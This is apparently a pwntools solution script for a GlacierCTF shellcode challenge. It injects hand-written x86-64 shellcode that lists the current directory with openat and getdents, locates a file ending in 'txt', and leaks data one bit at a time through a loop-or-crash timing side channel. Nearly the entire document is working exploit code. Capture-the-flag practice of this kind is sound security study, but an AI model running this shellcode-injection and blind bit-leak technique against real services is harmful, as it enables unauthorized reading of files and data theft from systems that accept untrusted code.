#!/usr/bin/env python3
from pwn import *
from Crypto.Util.number import long_to_bytes
exe = context.binary = ELF(args.EXE or './vuln')
context.terminal = ["tmux", "splitw", "-h"]
host = args.HOST or 'chall.glacierctf.com'
port = int(args.PORT or 13383)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env={},*a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# read = 0x0
# getdents = 0x4e
# openat = 0x101
gdbscript = '''
b *main+220
continue
'''.format(**locals())

shellcode = """
open_cur_dir:
    xor edi, edi
    sub edi, 0x64
    push 0x2e
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 1
    shl rdx, 0x10
    mov r10, rdx
    mov rax, 0x101
    syscall

call_dirent:
    mov rdi, rax
    sub rsp, 0x1000
    mov rsi, rsp
    mov rax, 0x4e
    syscall

xor rax, rax
search_flag_file:
    mov ax, word ptr[rsp+0x10]
    lea rcx, [rsp+0x11]
    lea rsp, [rsp+rax]
find_null:
    add rcx, 0x1
    cmp byte ptr[rcx], 0x00
    jne find_null

check:
    cmp byte ptr[rcx-1], 0x74
    jne search_flag_file
    cmp byte ptr[rcx-2], 0x78
    jne search_flag_file
    cmp byte ptr[rcx-3], 0x74
    jne search_flag_file

leak_flag_txt:
    sub rsp, rax
    add rsp, 0x12
    mov al, [rsp+{}]
    shr al, {}
    and al, 1
    test al, al
loop:
    jnz loop
"""
flag_file = 0
ctr = 0
context.timeout = 1
context.log_level = "error"
from rich.progress import track

for byte_offset in track(range(0,40)):
    for bit_offset in range(8):
        try:
            io = start()
            payload = asm(shellcode.format(byte_offset, bit_offset), arch="amd64", bits=64)
            io.sendlineafter(b"Shellcode:", payload)
            io.readline()
            io.close()
            #print(f"Got a 1 with : {byte_offset}:{bit_offset}")
            flag_file |= (1 << ctr)
        except Exception as e:
            pass
        ctr += 1


print(long_to_bytes(flag_file)[::-1])
